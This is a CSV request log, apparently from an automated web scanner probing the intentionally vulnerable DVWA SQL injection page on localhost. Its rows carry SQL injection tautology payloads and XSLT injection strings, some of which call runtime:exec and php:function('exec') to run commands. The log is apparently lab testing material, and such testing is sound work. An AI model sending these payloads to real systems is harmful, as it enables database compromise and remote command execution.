ID,Petición (Tiempo),Marca de tiempo Respuesta,Método,URL,Código,Razón,RTT,Tamaño de la Cabecera de Respuesta,Respuesta (Tamaño del cuerpo)
315,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit,200,OK,0,613,1342
316,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&=,200,OK,1,613,1342
317,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=,200,OK,1,613,1342
318,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%40,200,OK,0,613,1342
319,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%2B,200,OK,1,613,1342
320,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%00,200,OK,1,613,1342
321,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%7C,200,OK,1,613,1342
322,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/actuator/health,404,Not Found,1,161,311
323,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli,301,Moved Permanently,1,224,366
324,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/actuator/health,404,Not Found,1,161,311
325,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli,301,Moved Permanently,2,224,366
326,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%3C&Submit=Submit,200,OK,1,613,1342
327,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E&Submit=Submit,200,OK,1,613,1342
328,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=system-property%28%27xsl%3Avendor%27%29%2F%3E&Submit=Submit,200,OK,1,613,1342
329,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&Submit=Submit,200,OK,1,613,1342
330,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&Submit=Submit,200,OK,1,613,1342
331,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Flocalhost%3A22%27%29%22%2F%3E&Submit=Submit,200,OK,1,613,1342
332,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E&Submit=Submit,200,OK,1,613,1342
333,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E&Submit=Submit,200,OK,1,613,1342
334,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%3C,200,OK,1,613,1342
335,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,1,613,1342
336,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,1,613,1342
337,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,1,613,1342
338,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli,301,Moved Permanently,1,224,366
339,Thu Mar 19 10:06:39 CST 2026,Thu Mar 19 10:06:39 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli,301,Moved Permanently,1,224,366
